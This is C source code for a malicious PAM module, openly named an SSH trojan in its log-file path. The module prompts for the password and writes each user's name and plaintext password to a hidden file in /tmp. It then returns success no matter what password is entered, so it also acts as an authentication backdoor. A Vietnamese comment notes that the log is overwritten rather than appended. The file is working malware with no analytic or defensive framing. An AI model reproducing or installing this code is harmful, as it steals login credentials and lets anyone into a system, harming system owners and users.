#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define LOG_FILE "/tmp/.log_sshtrojan1.txt"

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *pass;
    const char *user;
    int retval = pam_get_user(pamh, &user, NULL);
    if (retval != PAM_SUCCESS) return retval;

    struct pam_message msg = { .msg_style = PAM_PROMPT_ECHO_OFF, .msg = "Password: " };
    const struct pam_message *msgp = &msg;
    struct pam_response *resp;
    struct pam_conv *conv;

    retval = pam_get_item(pamh, PAM_CONV, (const void **)&conv);
    if (retval != PAM_SUCCESS) return retval;
    
    retval = conv->conv(1, &msgp, &resp, conv->appdata_ptr);
    if (retval != PAM_SUCCESS || !resp) return retval;
    
    pass = resp->resp;
    
    // Đã thay O_APPEND bằng O_TRUNC để ghi đè thay vì ghi nối tiếp
    int log_fd = open(LOG_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (log_fd >= 0) {
        dprintf(log_fd, "User: %s, Password: %s\n", user, pass);
        close(log_fd);
    }
    
    free(resp->resp);
    free(resp);
    
    return PAM_SUCCESS;
}

int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
